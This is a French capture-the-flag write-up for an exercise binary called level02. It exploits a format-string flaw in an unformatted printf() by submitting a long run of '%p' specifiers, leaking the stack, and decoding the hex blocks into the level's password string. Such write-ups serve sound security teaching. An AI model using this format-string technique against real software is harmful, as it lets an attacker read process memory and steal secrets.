En analysant le code, nous remarquons une faille que nous avons deja utilise dans le passe: printf(). Ce dernier ne possede pas un format, ce qui constitue une faille, nous pouvons mettre le format que nous souhaitons, et donc lire la stack.

--> Nous allons donc afficher toutes les informations a partir de ce printf:

```shell
./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
--[ Password: *****************************************
# Resultat: 0x7fffffffe0f0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe2e8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070 (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```

--> Analysons pas a pas nos donnees:

Les adresses memoires (0x7fffffffe0f0) et les (nil) seront ignore, il nous reste:

`0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070 0x100000000 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070`

Les adresses 0x2a2a... sont en realite les puts(*************), nous les enlevons aussi:

`0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070 0x100000000 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070`

Les adresses avec un motif se repetant (252070252070...) correspondant a nos `%p `, nous les enlevons donc egalement:

`0x1f7ff9a08 0x100000000 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00`

Enfin, 0x1f7ff9a08 est un pointeur vers la heap tandis que 0x100000000 est un vestige de compilation, il nous reste donc:

`0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00`

--> Nous nous retrouvons avec l'ASCII de notre flag, nous n'avons plus qu'a traduire (rappel: c'est inverse a l'interieur des blocs):

Bloc 1: 0x756e505234376848 --> 48,68,37,34,52,50,6e,75 --> H,h,7,4,R,P,n,u --> Hh74RPnu
Bloc 2: 0x45414a3561733951 --> 51,39,73,61,35,4a,41,45 --> Q,9,s,a,5,J,A,E --> Q9sa5JAE
Bloc 3: 0x377a7143574e6758 --> 58,67,4e,57,43,71,7a,37 --> X,g,N,W,C,q,z,7 --> XgNWCqz7
Bloc 4: 0x354a35686e475873 --> 73,58,47,6e,68,35,4a,35 --> s,X,G,n,h,5,J,5 --> sXGnh5J5
Bloc 5: 0x48336750664b394d --> 4d,39,4b,66,50,67,33,48 --> M,9,K,f,P,g,3,H --> M9KfPg3H
Bloc 6: 0xfeff00 --> \0

Donc en les mettant bout a bout: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H



